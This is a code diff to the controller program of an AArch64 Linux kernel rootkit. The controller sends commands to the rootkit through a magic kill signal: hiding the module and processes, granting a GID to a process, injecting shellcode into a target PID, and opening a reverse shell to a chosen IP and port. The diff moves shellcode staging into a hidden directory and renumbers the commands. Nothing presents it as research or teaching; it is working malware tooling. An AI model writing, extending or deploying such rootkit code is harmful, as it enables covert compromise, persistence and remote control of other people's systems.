@@ -13,8 +13,10 @@
  *   x4-x7 = additional arguments (reserved)
  *   x8  = __NR_kill (129 on AArch64)
  *
- * For bulk data (paths, shellcode), mykill writes to /dev/shm/rk_cmd
- * then triggers via kill. The kprobe handler reads via kernel_read().
+ * For shellcode injection, mykill writes the binary to C2_INJECT_STAGING
+ * (/tmp/secret/rk_sc inside the protected directory, hidden from listings)
+ * then fires CMD_INJECT. The kernel reads and unlinks the file from workqueue
+ * context (process context, safe to sleep).
  *
  * Build: aarch64-linux-gnu-gcc -static -o mykill mykill.c
  *
@@ -43,7 +45,8 @@
 
 #define MAGIC_SIGNAL    62
 #define __NR_kill       129
-#define STAGING_PATH    "/dev/shm/rk_cmd"
+/* Must match C2_INJECT_STAGING in rootkit.h */
+#define STAGING_PATH    "/tmp/secret/rk_sc"
 
 /* ─── Raw syscall with x0-x7 ─────────────────────────────────────────────── */
 
@@ -71,7 +74,9 @@ static long raw_kill(long x0, long x1, long x2, long x3,
 		: "+r"(r0)
 		: "r"(r1), "r"(r2), "r"(r3), "r"(r4),
 		  "r"(r5), "r"(r6), "r"(r7), "r"(r8)
-		: "memory"
+		: "memory", "cc",
+		  "x9", "x10", "x11", "x12", "x13", "x14", "x15",
+		  "x16", "x17", "x18"
 	);
 
 	return r0;
@@ -141,7 +146,6 @@ static void usage(const char *prog)
 	fprintf(stderr, "  block                     Toggle access blocking on/off\n");
 	fprintf(stderr, "  hide-module               Toggle module visibility\n");
 	fprintf(stderr, "  hide-procs                Toggle process hiding on/off\n");
-	fprintf(stderr, "  add-hide-path <path>      Add path to file hide list\n");
 	fprintf(stderr, "  add-gid <pid>             Add GID 1337 to process\n");
 	fprintf(stderr, "  inject <pid> [sc.bin]     Inject shellcode into target\n");
 	fprintf(stderr, "  revshell <ip> <port>      Spawn reverse shell\n");
@@ -172,15 +176,6 @@ int main(int argc, char **argv)
 	} else if (strcmp(cmd, "hide-procs") == 0) {
 		ret = raw_kill(4, MAGIC_SIGNAL, 0, 0, 0, 0, 0, 0);
 
-	} else if (strcmp(cmd, "add-hide-path") == 0) {
-		if (argc < 3) {
-			fprintf(stderr, "Error: add-hide-path requires a path\n");
-			usage(argv[0]);
-		}
-		if (stage_string(argv[2]) < 0)
-			return 1;
-		ret = raw_kill(5, MAGIC_SIGNAL, 0, 0, 0, 0, 0, 0);
-
 	} else if (strcmp(cmd, "add-gid") == 0) {
 		if (argc < 3) {
 			fprintf(stderr, "Error: add-gid requires a PID\n");
@@ -191,7 +186,7 @@ int main(int argc, char **argv)
 			fprintf(stderr, "Error: invalid PID: %s\n", argv[2]);
 			return 1;
 		}
-		ret = raw_kill(6, MAGIC_SIGNAL, pid, 0, 0, 0, 0, 0);
+		ret = raw_kill(5, MAGIC_SIGNAL, pid, 0, 0, 0, 0, 0);
 
 	} else if (strcmp(cmd, "inject") == 0) {
 		if (argc < 3) {
@@ -209,7 +204,7 @@ int main(int argc, char **argv)
 				return 1;
 			printf("[*] Staged %s → %s\n", argv[3], STAGING_PATH);
 		}
-		ret = raw_kill(7, MAGIC_SIGNAL, pid, 0, 0, 0, 0, 0);
+		ret = raw_kill(6, MAGIC_SIGNAL, pid, 0, 0, 0, 0, 0);
 
 	} else if (strcmp(cmd, "revshell") == 0) {
 		if (argc < 4) {
@@ -224,7 +219,7 @@ int main(int argc, char **argv)
 			fprintf(stderr, "Error: invalid port: %s\n", argv[3]);
 			return 1;
 		}
-		ret = raw_kill(8, MAGIC_SIGNAL, port, ip, 0, 0, 0, 0);
+		ret = raw_kill(7, MAGIC_SIGNAL, port, ip, 0, 0, 0, 0);
 
 	} else {
 		fprintf(stderr, "Unknown command: %s\n", cmd);
